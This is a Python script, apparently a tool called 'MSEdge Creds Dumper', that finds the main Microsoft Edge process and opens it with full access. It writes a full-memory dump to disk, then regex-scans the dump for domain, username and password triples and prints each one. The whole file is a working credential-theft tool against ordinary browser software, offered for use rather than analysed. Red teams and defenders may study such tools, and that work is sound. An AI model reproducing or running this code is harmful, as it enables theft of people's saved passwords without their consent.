
import psutil,  ctypes, sys
import ctypes.wintypes as wt
print(r'''
___  ___ _____ _____    _              _____              _      ______                                 
|  \/  |/  ___|  ___|  | |            /  __ \            | |     |  _  \                                
| .  . |\ `--.| |__  __| | __ _  ___  | /  \/_ __ ___  __| |___  | | | |_   _ _ __ ___  _ __   ___ _ __ 
| |\/| | `--. \  __|/ _` |/ _` |/ _ \ | |   | '__/ _ \/ _` / __| | | | | | | | '_ ` _ \| '_ \ / _ \ '__|
| |  | |/\__/ / |__| (_| | (_| |  __/ | \__/\ | |  __/ (_| \__ \ | |/ /| |_| | | | | | | |_) |  __/ |   
\_|  |_/\____/\____/\__,_|\__, |\___|  \____/_|  \___|\__,_|___/ |___/  \__,_|_| |_| |_| .__/ \___|_|   
                           __/ |                                                       | |              
                          |___/                                                        |_|              

''')

print("[+] Based on the research by https://x.com/L1v1ng0ffTh3L4N")
print("[+] Built by: Kavin Jindal (https://github.com/kavin-jindal)")
print("[!] Report any issues or bugs to the official repository.")
dbghelp = ctypes.WinDLL('dbghelp.dll', use_last_error=True)
kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)
try:

    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        edge=['Microsoft Edge', 'msedge.exe']
        name = proc.info['name']
        cmdline = proc.info['cmdline']
        if name in edge:
            if not any(i.startswith("--type=") for i in cmdline):
                
                final_pid = proc.info['pid']
except Exception as e:
    print(f"[!] {e}")
    
        


pid=final_pid
dbghelp.MiniDumpWriteDump.restype=wt.BOOL
dbghelp.MiniDumpWriteDump.argtypes=[
    wt.HANDLE,
    wt.DWORD,
    wt.HANDLE,
    ctypes.c_int,
    ctypes.c_void_p,
    ctypes.c_void_p,
    ctypes.c_void_p,

]

# open process
kernel32.OpenProcess.restype=wt.HANDLE
kernel32.OpenProcess.argtypes = [
    wt.DWORD,
    wt.BOOL,
    wt.DWORD
]
PROCESS_ALL_ACCESS=0x1F0FFF
hProcess=kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

# create file

kernel32.CreateFileW.restype = wt.HANDLE
kernel32.CreateFileW.argtypes=[
    wt.LPCWSTR,  
    wt.DWORD,    
    wt.DWORD,    
    ctypes.c_void_p,  
    wt.DWORD,    
    wt.DWORD,    
    wt.HANDLE

]
GENERIC_WRITE       = 0x40000000
CREATE_ALWAYS       = 2
FILE_ATTRIBUTE_NORMAL = 0x80
hFile=kernel32.CreateFileW(
    'edge.dmp',
    GENERIC_WRITE,
    0,
    None,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    None
)

MiniDumpWithFullMemory=0x00000002
success=dbghelp.MiniDumpWriteDump(
    hProcess,
    pid,
    hFile,
    MiniDumpWithFullMemory,
    None,
    None,
    None
)

kernel32.CloseHandle(hFile)
kernel32.CloseHandle(hProcess)

from minidump.minidumpfile import MinidumpFile
import re

dump    = MinidumpFile.parse(r'edge.dmp')
reader  = dump.get_reader()
segments = dump.memory_segments or dump.memory_segments_64.memory_segments

# capture: domain | username | password
pattern = rb"([a-zA-Z0-9.-]{3,50})\.comhttps\s+(\S+)\s+(\S+)"

CHUNK = 1024 * 1024
seen  = set()
print("-" * 50)

for seg in segments:
    addr      = seg.start_virtual_address
    remaining = seg.size

    while remaining > 0:
        size = min(CHUNK, remaining)
        try:
            data = reader.read(addr, size)
            for m in re.finditer(pattern, data):
                domain   = m.group(1).decode(errors="ignore") + ".com"
                username = m.group(2).decode(errors="ignore")
                password = m.group(3).decode(errors="ignore")

                key = (domain, username, password)
                if key in seen:
                    continue
                seen.add(key)

                print(f"[DOMAIN]   {domain}")
                print(f"[USERNAME] {username}")
                print(f"[PASSWORD] {password}")
                print("-" * 50)
        except:
            pass

        addr      += size
        remaining -= size
